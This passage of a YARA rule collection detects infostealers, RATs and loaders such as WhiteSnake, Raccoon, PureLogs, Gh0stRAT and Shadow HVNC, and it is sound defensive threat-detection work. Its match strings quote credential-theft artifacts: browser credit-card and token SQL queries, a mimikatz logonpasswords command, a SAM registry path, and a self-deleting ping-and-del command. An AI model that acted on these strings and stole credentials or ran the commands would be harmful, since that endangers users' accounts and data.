		date = "2026-06-04"
		modified = "2026-06-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ClickFix/RMMProject.yar#L1-L13"
		license_url = "N/A"
		hash = "3b7ae925e2d64522b4f69b56285b05aeca8c5aab5ab46a9c02c4fafb69d881ce "
		logic_hash = "ab444a5c7c779d6e4a14159f51865ae01bb82a885f0009e0e6262354e8d6af86"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "[RTSC] OpenInputSocket: sending session_id=" ascii
		$s2 = "kCookies: total_cookies=" ascii
		$s3 = "GetChromiumKey" ascii

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $s* )
}
rule RUSSIANPANDA_Whitesnakestealer : FILE
{
	meta:
		description = "WhiteSnake Stealer"
		author = "RussianPanda"
		id = "70b69aba-5096-59a6-bb0b-44d248aecc26"
		date = "2023-07-04"
		modified = "2023-12-11"
		reference = "https://russianpanda.com/2023/07/04/WhiteSnake-Stealer-Malware-Analysis/"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/WhiteSnake-Stealer/WhiteSnake_rc4.yar#L1-L17"
		license_url = "N/A"
		logic_hash = "24985a2c3b0d72858decd17cb2b8e485caa94c01ad72a014edc68ed4facfd71e"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {73 68 69 74 2e 6a 70 67}
		$s2 = {FE 0C ?? 00 20 00 01 00 00 3F ?? FF FF FF 20 00 00 00 00 FE 0E ?? 00 38 ?? 00 00 00 FE 0C}
		$s3 = "qemu" wide
		$s4 = "vbox" wide

	condition:
		all of ( $s* ) and filesize < 300KB
}
rule RUSSIANPANDA_Whitesnakestealer_1 : FILE
{
	meta:
		description = "Detects WhiteSnake Stealer XOR samples "
		author = "RussianPanda"
		id = "cfe168a6-cc2f-5cfe-985c-78b232dc2651"
		date = "2023-07-04"
		modified = "2023-12-11"
		reference = "https://russianpanda.com/2023/07/04/WhiteSnake-Stealer-Malware-Analysis/"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/WhiteSnake-Stealer/WhiteSnake_xor.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "0bd0e250b8598be297296ecf6644d3bf649e3dc4598438325a0913afed04c819"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {FE 0C 00 00 FE 09 00 00 FE 0C 02 00 6F ?? 00 00 0A FE 0C 03 00 61 D1 FE 0E 04 00 FE}
		$s2 = {61 6e 61 6c 2e 6a 70 67}

	condition:
		all of ( $s* ) and filesize < 600KB
}
rule RUSSIANPANDA_Win_Mal_Chromium_App_Bound_Encryption_Decrypter : FILE
{
	meta:
		description = "Detects Potential Chromium app_bound_encryption key Decrypter"
		author = "RussianPanda"
		id = "f3c500cb-52d1-5e89-a927-36da6246d2cb"
		date = "2025-02-13"
		modified = "2025-02-14"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/UNC4108/win_mal_Chromium_app_bound_encryption_Decrypter.yar#L1-L26"
		license_url = "N/A"
		hash = "0f4dcfd8c9ada67a9b41033fc715d370399fd74ca94dbb8a1ea45b3785c88d02"
		logic_hash = "e871c9a6762c38baeed287e9350530c2c3cd02333b1830210ef74c258bd223b9"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$op_chr_1 = {E0 60 88 70 41 F6 11 46}
		$op_chr_2 = {88 95 7D 86 7D D3 67 5B}
		$op_chr_3 = {CF BE 3A 46 0D 41 7F 40}
		$op_chr_4 = {8A F5 0D F3 5A 00 5C C8}
		$op_br_1 = {AF 31 6B 57 69 63 6B 4B}
		$op_br_2 = {85 60 E4 B2 03 A9 7A 8B}
		$op_br_3 = {1E 86 96 F3 8E 0C 71 4C}
		$op_br_4 = {82 56 2F AE 6D 75 9C E9}
		$op_edg_1 = {6C E9 CB 1F 97 16 AF 43}
		$op_edg_2 = {91 40 28 97 C7 C6 97 67}
		$op_edg_3 = {07 B8 C2 C9 31 77 34 4F}
		$op_edg_4 = {81 B7 44 FF 77 79 52 2B}
		$riid1 = {CF BE 3A 46 0D 41 7F 40 8A F5 0D F3 5A 00 5C C8}
		$riid2 = {1E 86 96 F3 8E 0C 71 4C 82 56 2F AE 6D 75 9C E9}
		$dll1 = "CoCreateInstance"
		$dll2 = "CoInitializeEx"

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $dll* ) and all of ( $riid* ) and 8 of ( $op_* )
}
rule RUSSIANPANDA_Win_Mal_Formgrabber : FILE
{
	meta:
		description = "Detects Formgrabber Plugin"
		author = "RussianPanda"
		id = "818405a9-4348-5c4a-a4d1-e35b4f525e25"
		date = "2025-02-13"
		modified = "2025-02-14"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/UNC4108/win_mal_Formgrabber.yar#L1-L14"
		license_url = "N/A"
		hash = "33ea72b46af7bb2ecc0775f7536d3259f34bd7a13e298cac66649ee694097c2e"
		logic_hash = "649e2a5b018b79d3d8534baf8432924f7ee197f26aebbfd384dd613c31d1b035"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "frmgrb"
		$s2 = "WebfakeRecords"
		$s3 = "urlblocklist"
		$s4 = "mscoree.dll"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Win_Mal_Mmgrabber : FILE
{
	meta:
		description = "Detects mmgrabber Plugin"
		author = "RussianPanda"
		id = "9d16282e-0cf3-527c-89df-51ae0d156e70"
		date = "2025-02-13"
		modified = "2025-02-14"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/UNC4108/win_mal_mmgrabber.yar#L1-L14"
		license_url = "N/A"
		hash = "40ebd719aa66a88e261633887ed4e2c144bd11fbcc6f7793f9b32652cc5bf2d3"
		logic_hash = "149c81b3c1a33933da0c181b8e8a90f40ba5fd8961d6340470790eb375c9695b"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "GrabDesktopWallets"
		$s2 = "GrabChromeExtensions"
		$s3 = "FindExodusFolder"
		$s4 = "mscoree.dll"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Win_Mal_Juniperstealer : FILE
{
	meta:
		description = "Detects Juniper Stealer"
		author = "RussianPanda"
		id = "d8ad9175-a226-5e09-a206-b3da42c1db42"
		date = "2025-02-13"
		modified = "2025-02-14"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/UNC4108/win_mal_JuniperStealer.yar#L1-L14"
		license_url = "N/A"
		hash = "44dc2777ee8dd6d5cd8ebb10e71caf73b330940131417b5fca2b174a264e19e3"
		logic_hash = "e3d05058bbb0e8e408f2b6cf24cb2462b6a3f237c3c464b891cda705b4968c02"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "OutlookDecryptPwd"
		$s2 = "CookiesNew"
		$s3 = "Cookies128"
		$s4 = "mscoree.dll"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Win_Mal_Ghostweaver : FILE
{
	meta:
		description = "Detects GhostWeaver backdoor"
		author = "RussianPanda"
		id = "febabd9a-b738-5ed8-b605-4bbef86ce8ac"
		date = "2025-02-15"
		modified = "2025-02-15"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/UNC4108/win_mal_GhostWeaver.yar#L1-L13"
		license_url = "N/A"
		hash = "5051f0aa11da67e16797daa51992467ad45c5bf18dcd2e252e8aa63d3fce31bc"
		logic_hash = "6901fa0e7d5a911a0029536ac38d9a2a248fa72126114b10ea941cc8b4329d12"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "$global:keystr"
		$s2 = "stub"
		$s3 = "ForEach-Object"

	condition:
		all of them and filesize < 1MB and @s3 > 100
}
rule RUSSIANPANDA_Jinxloader : FILE
{
	meta:
		description = "Detects JinxLoader Golang version"
		author = "RussianPanda"
		id = "25570c99-5938-5be0-a153-a07be0d0571c"
		date = "2024-01-02"
		modified = "2024-01-02"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/JinxLoader/JinxLoader-1-2-2024.yar#L1-L16"
		license_url = "N/A"
		hash = "6bd7ff5d764214f239af2bb58b368308c2d04f1147678c2f638f37a893995f71"
		logic_hash = "13dee435fb4d40c629c0a30b6f655b87f14b10a6f6acf61d00e6c692c9bb0ff1"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$s1 = {72 75 6E 74 69 6D 65 2E 67 6F 70 61 6E 69 63}
		$s2 = {48 8D 05 4D 6E 07 00 BB 0A 00 00 00}
		$s3 = {73 65 6C 66 5F 64 65 73 74 72 75 63 74 2E 62 61 74}
		$s4 = {48 8D 1D B7 24 08 00 [25] E8 EF FC E4 FF}

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $s* ) and filesize < 9MB
}
rule RUSSIANPANDA_Raccoonstealer : FILE
{
	meta:
		description = "Detects Raccoon Stealer v2.3.1.1"
		author = "RussianPanda"
		id = "29f28cd5-370b-5831-8b71-a253f468f7e4"
		date = "2024-01-08"
		modified = "2024-01-08"
		reference = "https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-raccoon-stealer-v2-0"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/RaccoonStealer_v2/raccoonstealer_v2.3.1.1.yar#L1-L20"
		license_url = "N/A"
		hash = "c6d0d98dd43822fe12a1d785df4e391db3c92846b0473b54762fbb929de6f5cb"
		logic_hash = "ee2b39c1c2068b97e63a03330a2f9e2f12e53aaf9cfffb274acde2372a11fe45"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {8B 0D [2] 41 00 A3 [3] 00}
		$s2 = "MachineGuid"
		$s3 = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
		$s4 = "SELECT service, encrypted_token FROM token_service"
		$s5 = "&configId="
		$s6 = "machineId="

	condition:
		all of ( $s* ) and #s1 > 10 and uint16( 0 ) == 0x5A4D and filesize < 5MB
}

rule RUSSIANPANDA_Andeloader
{
	meta:
		description = "Detects Ande Loader"
		author = "RussianPanda"
		id = "c08d63b6-9fef-505d-9611-9dd0403c7c7c"
		date = "2023-12-11"
		modified = "2023-12-11"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/AndeLoader/ande_loader.yar#L3-L18"
		license_url = "N/A"
		logic_hash = "cd55153077e5cfbd84cbe5b062dbd842def245417acfea4ed6c2b1db702dcc81"
		score = 75
		quality = 83
		tags = ""

	strings:
		$s1 = {59 61 6E 6F 41 74 74 72 69 62 75 74 65}
		$s2 = "CreateShortcut" wide
		$s3 = ".vbs" wide

	condition:
		3 of ( $s* ) and pe.imports ( "mscoree.dll" )
}
rule RUSSIANPANDA_RMMCRAT : FILE
{
	meta:
		description = "Detects RMMCRAT"
		author = "PandaRE"
		id = "49d2a401-b80c-5e94-a251-55a573c34c04"
		date = "2026-09-22"
		modified = "2026-09-22"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SEOPoison/rmmcrat.yar#L1-L12"
		license_url = "N/A"
		hash = "3afabe2f9197f66460044083c708a5206291b2efe1138be1c763f60c47069787"
		logic_hash = "f5512dcaa603a567a48517c96b567f970fbfaada4a99bbeb0c4cb5ac02760883"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "RMMC"
		$s2 = "RMM Agent embedded configuration"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Aurorastealer_March_2023
{
	meta:
		description = "Detects an unobfuscated AuroraStealer March update binary"
		author = "RussianPanda"
		id = "a115de7a-bff7-5bb0-b83f-f66a29bbcf3f"
		date = "2023-03-23"
		modified = "2023-05-05"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/AuroraStealer/Aurora_March_2023.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "d74d2843a03e826f334ce3c5eb10cc2b43cfd832174769e5d067fb877abe13a0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$b1 = { 48 8D 0D ?? ?? 05 00 E8 ?? ?? EF FF }
		$ftp = "FOUND FTP"

	condition:
		all of them
}
rule RUSSIANPANDA_Shadowhvnc_Loader : FILE
{
	meta:
		description = "Detects Shadow HVNC Loader"
		author = "PandaRE"
		id = "8ca73a8a-cc60-50ad-8da6-963fbc10d66b"
		date = "2026-08-17"
		modified = "2026-08-18"
		reference = "https://malbearlabs.com/shadow-hvnc-and-shadow-loader-the-kit-that-protects-its-license-better-than-its-customers-dd99520b6af3"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ShadowHVNC/win_mal_shadowhvnc_loader.yar#L1-L16"
		license_url = "N/A"
		logic_hash = "cab870af1988fffdd6e144fbeba558079d03b61b79154665f52e86e51a4ac589"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "Local\\BridgeAgent"
		$s2 = "windows_clipboard_failed"
		$s3 = "/api/agent/connect"
		$s4 = "binding Backstage worker to private desktop"

	condition:
		uint16( 0 ) == 0x5A4D and 3 of them
}
rule RUSSIANPANDA_Shadowhvnc_Stealer : FILE
{
	meta:
		description = "Detects Shadow HVNC Stealer"
		author = "PandaRE"
		id = "6d4acd27-6003-5e83-a14c-ca620692b2d8"
		date = "2026-08-17"
		modified = "2026-08-18"
		reference = "https://malbearlabs.com/shadow-hvnc-and-shadow-loader-the-kit-that-protects-its-license-better-than-its-customers-dd99520b6af3"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ShadowHVNC/win_mal_shadowhvnc_stealer.yar#L1-L19"
		license_url = "N/A"
		hash = "d07278643de28cdd30ff28255a1797bb"
		logic_hash = "ec6a669e5f303bfedb1a2c78bc194b86691389589f7846a6419d14491bc60b54"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "[rdp] collecting RDP connection data"
		$s2 = "[DEFENDER] no path or process specified"
		$s3 = "RXMAGIC_C2HOST"
		$s4 = "[WD] guard mode: watching PID %d"
		$s5 = "[WD-KILL] nuclear kill switch activated"
		$s6 = "[WD] WMI subscription installed"

	condition:
		uint16( 0 ) == 0x5A4D and 4 of them
}
rule RUSSIANPANDA_Purelogs_Stealer_Initial_Dropper : FILE
{
	meta:
		description = "Detects PureLogs Stealer Initial Payload"
		author = "RussianPanda"
		id = "c1e6a0a0-f8ed-5b78-bcae-55c1c1dfc9e4"
		date = "2024-01-10"
		modified = "2024-01-10"
		reference = "https://russianpanda.com/2023/12/26/Pure-Logs-Stealer-Malware-Analysis/"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Pure Logs Stealer/purelogs_stealer_initial_payload.yar#L1-L19"
		license_url = "N/A"
		logic_hash = "0fe94c705b94f82163f952d0a29aac4689947a1d439bdc1847ee510c25cf2e40"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {73 ?? 00 00 06 28 ?? 00 00 ?? 2A}
		$s2 = {28 ?? 00 00 06 74 ?? 00 00 1B 28 ?? 00 00 0A 2A}
		$s3 = {28 ?? 00 00 ?? 75 ?? 00 00 01 72 ?? 00 00 70 6F ?? 00 00 0A 2A}
		$s4 = {28 ?? 00 00 ?? 75 ?? 00 00 01 72 ?? 00 00 ?? 20 00 01 00 00 14 14 14 6F ?? 00 00 ?? 26}
		$s5 = {28 ?? 00 00 ?? 73 ?? 00 00 [29] 73 15 00 00 0A [22] 28 01 00 00 2B 28 02 00 00 2B}

	condition:
		all of ( $s* ) and uint16( 0 ) == 0x5A4D and filesize < 1MB
}

rule RUSSIANPANDA_Purelogs_Stealer_Core : FILE
{
	meta:
		description = "Detects Pure Logs Stealer Core Payload"
		author = "RussianPanda"
		id = "bda876c3-76ce-5e1e-8dd4-f06e8240fc11"
		date = "2023-12-26"
		modified = "2024-01-10"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Pure Logs Stealer/purelogs_stealer_core.yar#L3-L18"
		license_url = "N/A"
		logic_hash = "7388299ebcc70aeb86c46c29a787f790993a67148d9f3968def1109e45f69452"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {7E 58 00 00 0A [15] 28 20 00 00 0A 18 6F 0A 02 00 0A 0B}
		$s2 = {50 6C 67 43 6F 72 65}
		$s3 = {7E 64 01 00 0A 28 65 01 00 0A}

	condition:
		all of ( $s* ) and filesize < 5MB and pe.imports ( "mscoree.dll" )
}
rule RUSSIANPANDA_Ghostgambit : FILE
{
	meta:
		description = "Detects GhostGambit dropper"
		author = "RussianPanda"
		id = "0348b9fa-59be-5f30-8ebc-f1e87cf98b07"
		date = "2024-07-09"
		modified = "2024-07-09"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/GhostGambit/GhostGambit.yar#L1-L14"
		license_url = "N/A"
		hash = "2b16c68d9bafbd2ecf3634d991d7c794"
		logic_hash = "419efbea3c347d0ec9365c0c21cccb6f229f8c42d22a2bcfdf14854e7f83aea1"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "/code32" ascii wide
		$s2 = "/reg32" ascii wide
		$s3 = "ZhuDongFangYu.exe" ascii wide
		$s4 = "/c ping -n 4 127.0.0.1 > nul && del" ascii wide

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}

rule RUSSIANPANDA_Swaetrat
{
	meta:
		description = "Detects SwaetRAT"
		author = "RussianPanda"
		id = "e5238ae4-7ae3-505c-a3fd-ecf6be608fac"
		date = "2023-11-27"
		modified = "2023-11-27"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SwaetRAT/swaetrat.yar#L3-L19"
		license_url = "N/A"
		logic_hash = "4dc1107a34d678c3fa0939fab7986fe744ac246400823d08b1ab6db0942821da"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "Pong"
		$s3 = "ReadData"
		$s4 = "DeskDrop" wide
		$s5 = "OfflineGet" wide

	condition:
		all of ( $s* ) and pe.imports ( "mscoree.dll" )
}
rule RUSSIANPANDA_Win_Brambly_Loader
{
	meta:
		description = "Brambly loader"
		author = "PandaRE"
		id = "989563ac-9141-5866-9f0e-9fa04ebeaf33"
		date = "2026-10-18"
		modified = "2026-10-22"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/BramblyLoader/win_bramblyloader.yar#L1-L59"
		license_url = "N/A"
		hash = "ca4717d84adc33c42fed4bd9f4656893a2f8892b943b250f5265cb6303b64371"
		logic_hash = "57578e80c9721b302ee31e573abba8d4d81893941ab0b8b97797a68b9e5c48ca"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a1 = {
            BA 62 6A 6C 6C
            [0-8]
            0F B6 ??
            6B D2 1F
            4?
            83 C? 20
       }
		$b1 = {81 FA 6C 1A A7 91}
		$b2 = {81 FA 46 5C 31 E8}
		$b3 = {81 FA EF 2B DD 68}
		$b4 = {81 FA 55 5C 7B 1D}
		$b5 = {81 FA 4E D9 0C 35}
		$b6 = {81 FA 19 D2 D7 3D}
		$b7 = {81 FA AA E1 F0 13}
		$c1 = {
            83 E? 7F
            8A 4C ?? 08
            30 [2]
            4?
       }
		$d1 = {83 ED 01 73 07 0F B6 ?? 4? 6A 07 5D}
		$e1 = {64 A1 18 00 00 00 [0-16] 8B 40 30}
		$e2 = {8B 4? 3C 8B 44 ?? 78}
		$e3 = {C7 40 04 6C 2E 64 6C C7 00 6E 74 64 6C}
		$e4 = {
            66 C7 44 24 ?? 4C 64
            C6 44 24 ?? 72
            66 C7 44 24 ?? 70 48
       }
		$e5 = {
            8B ?? A4 00 00 00
            C1 E? 08
            [0-8]
            66 81 FA 03 06
       }
		$e6 = {6A 00 6A 01 FF 74 24 ?? FF D?}
		$e7 = {59 5A 51 52 55 53 57 56 81 EC}

	condition:
		$a1 and 3 of ( $b* ) and $c1 and $d1 and 2 of ( $e* )
}
rule RUSSIANPANDA_Sentinel_Stealer
{
	meta:
		description = "Detects Sentinel Stealer"
		author = "RussianPanda"
		id = "8a221d7b-8fa6-53cd-a3e8-63cc67285186"
		date = "2024-01-19"
		modified = "2024-01-19"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SentinelStealer/sentinel_stealer.yar#L1-L14"
		license_url = "N/A"
		hash = "3a540a8a81c5a5b452f154d7875423a3"
		logic_hash = "b9d72848842ea4d26544633bb83fccd17239b28493bde3f73341eb2004d8ee0c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Sentinel.SmallerEncryptedIcon" wide
		$s2 = "SentinelSteals" wide
		$s4 = "_CorExeMain"

	condition:
		all of them
}
rule RUSSIANPANDA_Garystealer : FILE
{
	meta:
		description = "Detects GaryStealer 1-3-2024"
		author = "RussianPanda"
		id = "4b0af30e-2cf1-539d-89fa-7e4e32cd6eab"
		date = "2024-01-03"
		modified = "2024-01-03"
		reference = "https://cybersecurity.att.com/blogs/labs-research/behind-the-scenes-jaskagos-coordinated-strike-on-macos-and-windows"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/GaryStealer/garystealer-1-3-2024.yar#L1-L20"
		license_url = "N/A"
		hash = "6efa29a0f9d112cfbb982f7d9c0ddfe395b0b0edb885c2d5409b33ad60ce1435"
		logic_hash = "f71655d0cb237c08af9c298ec9eec1ae9bd1efd50e26d61afddf9056b6883a15"
		score = 75
		quality = 79
		tags = "FILE"

	strings:
		$s1 = {72 75 6e 74 69 6d 65 2e 67 6f 70 61 6e 69 63}
		$s2 = {4c 6f 63 61 6c 20 49 50 20 41 64 64 72 65 73 73 65 73 3a 5b 70 69 63 6b 2d 66 69 72 73 74 2d 6c 62 20 25 70 5d}
		$s3 = {70 65 72 73 69 73 74 61 6E 63 65 20 63 72 65 61 74 65 64}
		$s4 = {C7 40 28 ?? 00 00 00}

	condition:
		uint16( 0 ) == 0x5A4D and 3 of ( $s* ) and filesize < 20MB and #s4 > 2
}
rule RUSSIANPANDA_Fakebat_Powershell
{
	meta:
		description = "Detects FakeBat PowerShell scripts"
		author = "RussianPanda"
		id = "76149a6f-c370-5e48-82cc-c89b545c0aa8"
		date = "2023-12-01"
		modified = "2023-12-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/FakeBat/fakebat_powershell.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "df6b30d97ac6c9b248fed0d901e8a0a6ad1d855483a5006b008b839d9961092a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$LoadDomen/?status=start&av=" nocase
		$s2 = "$xxx.gpg" nocase

	condition:
		all of ( $s* )
}
rule RUSSIANPANDA_Meduzastealer_1 : FILE
{
	meta:
		description = "Detects MeduzaStealer 1-2024"
		author = "RussianPanda"
		id = "6bc4c048-a32d-5a9c-b213-980c64d08d29"
		date = "2024-01-01"
		modified = "2024-01-01"
		reference = "https://russianpanda.com/2023/06/28/Meduza-Stealer-or-The-Return-of-The-Infamous-Aurora-Stealer/"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/MeduzaStealer/MeduzaStealer_1-1-2024.yar#L1-L16"
		license_url = "N/A"
		logic_hash = "0547e51abd04302c45f1319bc21046ade019bc98eb85d9cba67cb2109ff642eb"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {41 70 70 44 61 74 61 5c 4c 6f 63 61 6c 5c 54 65 6d 70 5c 57 69 6e 55 70 64 61 74 65 2e 65 78 65}
		$s2 = {0f 57 ?? ?? ?? 00 00 66 0f 7f 85 ?? ?? 00 00}
		$s3 = {48 8d 15 ?? ?? 05 00 49 8b cf}
		$s4 = {48 8d 0d ?? ?? 06 00 ff 15 ?? ?? 06 00}

	condition:
		3 of ( $s* ) and filesize < 1MB
}
rule RUSSIANPANDA_Gh0Strat : FILE
{
	meta:
		description = "Detects Gh0stRAT"
		author = "RussianPanda"
		id = "db310549-feed-57b8-9ec0-232b6eda62f9"
		date = "2024-07-09"
		modified = "2024-07-09"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Gh0stRAT/Gh0stRAT.yar#L1-L14"
		license_url = "N/A"
		hash = "678b06ecdbc9b186788cf960332566f9"
		logic_hash = "bc4bdad83a0e23273774c3d4812cabe9fa44897c8ff2e308004e03b4f1622cd5"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "SAM\\SAM\\Domains\\Account\\Users\\Names\\%s"
		$s2 = "GetMP privilege::debug sekurlsa::logonpasswords exit"
		$s3 = "Http/1.1 403 Forbidden"
		$s4 = "WinSta0\\Default"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Win_Acrstealer : FILE
{
	meta:
		description = "ACRStealer infostealer"
		author = "PandaRE"
		id = "d70d6ae6-17f4-5794-a5a9-41c2d7e597dc"
		date = "2026-10-22"
		modified = "2026-10-22"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ACRStealer/win_acrstealer.yar#L1-L44"
		license_url = "N/A"
		hash = "9530cd1c1f44affa2df3ecabf987a489d1f1955faf39af345ee97a7fe4419d5a"
		logic_hash = "d4c5ba7b5845f65c470abf4c1fa57525ea9f19c9c107c216bd905680d7765bda"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$hash_b = {
            B8 75 65 73 70
            33 44 24 0C
            89 C1
            C1 E9 1E
        }
		$hash_mul = {
            BA B9 E5 E4 1C
            [0-4]
            F7 E2
            69 C? 6D 47 58 BF
        }
		$hash_f = {81 C6 44 81 70 75}
		$spltmix1 = {15 7C 4A 7F 81 D? B9 79 37 9E}
		$spltmix_dd = {BA 95 0A 22 27 [0-4] F7 E?}
		$dec = {
            55 53 57 56
            [0-8]
            E8
        }
		$xrsft = {C1 E? 0B [0-16] C1 E? 05}

	condition:
		uint16( 0 ) == 0x5A4D and $hash_b and $hash_mul and 2 of ( $spltmix1 , $spltmix_dd , $xrsft ) and ( $hash_f or $dec )
}
rule RUSSIANPANDA_Win_Mal_Koistealer_PS
{
	meta:
		description = "Detects KoiStealer PowerShell script"
		author = "RussianPanda"
		id = "6dfdb39c-1b6a-5969-9c2d-e09869af6e0f"
		date = "2024-04-04"
		modified = "2024-04-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Koi/win_mal_KoiStealer_PS.yar#L1-L12"
		license_url = "N/A"
		hash = "4f55be0b55ec67dfda42b88e9c743a2a"
		logic_hash = "8a60a1d770eb4b5048762ddfd4657fdf7a430b09eb454ae5a5bb3103460907db"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "index.php?id=$guid&subid="
		$s2 = "$config"

	condition:
		all of ( $s* )
}
rule RUSSIANPANDA_Win_Mal_Koi_Loader_Decrypted : FILE
{
	meta:
		description = "Detects decrypted Koi Loader"
		author = "RussianPanda"
		id = "71de93d3-5c9f-5994-a54d-d4455d500280"
		date = "2024-04-04"
		modified = "2024-04-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Koi/win_mal_Koi_loader_decrypted.yar#L1-L12"
		license_url = "N/A"
		hash = "1901593e0299930d46b963866f33a93b"
		logic_hash = "f73ada7185ff109afe1e186a0fb7b4420b3d0e04c93c7c5423243db97eb34e49"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {73 00 64 00 32 00 2E 00 70 00 73 00 31 00}
		$s2 = {25 00 74 00 65 00 6D 00 70 00 25 00 5C 00 25 00 70 00 61 00 74 00 68 00 73 00 25}

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $s* )
}
